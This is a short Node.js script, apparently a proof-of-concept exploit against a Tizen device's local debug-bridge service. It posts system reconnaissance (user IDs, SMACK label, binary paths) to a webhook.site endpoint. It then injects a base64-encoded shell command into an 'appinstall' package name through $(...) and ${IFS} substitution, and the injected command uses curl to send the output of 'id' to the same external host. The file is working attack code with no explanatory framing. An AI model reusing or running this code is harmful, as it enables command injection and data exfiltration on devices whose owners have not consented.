var fs = require('fs');
var https = require('https');
var adbhost = require('adbhost');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';

function send(path, body) {
    try {
        var req = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + path,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        req.on('error', function () {});
        req.end(String(body));
    } catch (e) {}
}

function report() {
    var out = [];
    out.push('uid=' + (process.getuid ? process.getuid() : '?'));
    out.push('gid=' + (process.getgid ? process.getgid() : '?'));
    out.push('node=' + process.version);
    try {
        out.push('smack=' + fs.readFileSync('/proc/self/attr/current', 'utf8').trim());
    } catch (e) {
        out.push('smackERR=' + e);
    }
    try {
        out.push('adbhost=' + typeof adbhost);
    } catch (e) {
        out.push('adbhostERR=' + e);
    }
    var paths = [
        '/usr/bin/dotnet-launcher-inhouse',
        '/usr/bin/dotnet',
        '/usr/bin/dotnet-launcher',
        '/usr/share/dotnet.tizen',
        '/usr/share/dotnet.tizen/framework/Tizen.Content.MimeType.dll',
        '/usr/bin/base64',
        '/usr/bin/openssl',
        '/usr/bin/curl',
        '/bin/sh',
        '/opt/usr/home/owner/share/tmp/sdk_tools'
    ];
    for (var i = 0; i < paths.length; i++) {
        try {
            var s = fs.statSync(paths[i]);
            out.push(paths[i] + ' mode=' + (s.mode & 4095).toString(8) + ' size=' + s.size);
        } catch (e) {
            out.push(paths[i] + ' ERR ' + (e.code || e.message));
        }
    }
    send('recon', out.join('\n'));
}

function inject(command, cb) {
    var b64 = new Buffer(command).toString('base64');
    var client;
    var settled = false;
    function done(err, output) {
        if (settled) return;
        settled = true;
        try { if (client && client._stream) client._stream.end(); } catch (e) {}
        cb(err, output || '');
    }
    try {
        client = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
        client.on('error', function (e) { done(e); });
        client.on('connect', function () {
            var stream = client.createStream("shell:0 appinstall tpk test.tpk$(echo${IFS}-n${IFS}'" + b64 + "'|base64${IFS}-d|sh).tpk\x00");
            var output = '';
            stream.on('data', function (d) { output += d.toString('utf8'); });
            stream.on('end', function () { done(null, output); });
            stream.on('error', function (e) { done(e, output); });
        });
    } catch (e) {
        done(e);
    }
}

report();
var command = 'curl -s https://webhook.site/' + TOKEN + '/sdk -d "$(id)"';
inject(command, function (err, output) {
    send('inject', 'err=' + err + '\noutput=' + output);
});
